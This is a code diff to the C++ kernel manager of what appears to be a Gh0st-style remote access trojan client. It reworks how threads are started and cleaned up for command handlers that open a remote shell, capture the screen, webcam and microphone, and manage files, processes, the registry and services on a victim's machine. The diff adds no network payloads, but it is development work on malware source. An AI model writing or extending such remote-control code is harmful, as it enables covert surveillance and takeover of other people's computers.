@@ -11,12 +11,12 @@
 
 CKernelManager::CKernelManager(IOCPClient* ClientObject):CManager(ClientObject)
 {
-	memset(m_hThread, NULL, sizeof(ThreadInfo) * 0x1000);
 	m_ulThreadCount = 0;
 }
 
 CKernelManager::~CKernelManager()
 {
+	printf("~CKernelManager \n");
 	int i = 0;
 	for (i=0;i<0x1000;i++)
 	{
@@ -24,6 +24,9 @@ CKernelManager::~CKernelManager()
 		{
 			CloseHandle(m_hThread[i].h);
 			m_hThread[i].h = NULL;
+			m_hThread[i].run = FALSE;
+			while (m_hThread[i].p)
+				Sleep(50);
 		}
 	}
 	m_ulThreadCount = 0;
@@ -40,7 +43,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopTalkManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -48,7 +51,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopShellManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -56,7 +59,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, 
 				(LPTHREAD_START_ROUTINE)LoopProcessManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -64,14 +67,18 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopWindowManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_BYE:
 		{
 			BYTE	bToken = COMMAND_BYE;      //包含头文件 Common.h     
-			m_ClientObject->OnServerSending((char*)&bToken, 1); 
+			m_ClientObject->OnServerSending((char*)&bToken, 1);
+			OutputDebugStringA("======> Bye bye \n");
+			m_hThread[m_ulThreadCount].p = NULL;
+			delete pNew;
+			pNew = NULL;
 			break;
 		}
 
@@ -79,7 +86,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopScreenManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -87,7 +94,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopFileManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -95,7 +102,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopVideoManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -103,7 +110,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopAudioManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -111,7 +118,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
-				pNew, 0, NULL);;
+				&m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -119,7 +126,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopServicesManager,
-				pNew, 0, NULL);
+				&m_hThread[m_ulThreadCount], 0, NULL);
 			break;
 		}
 
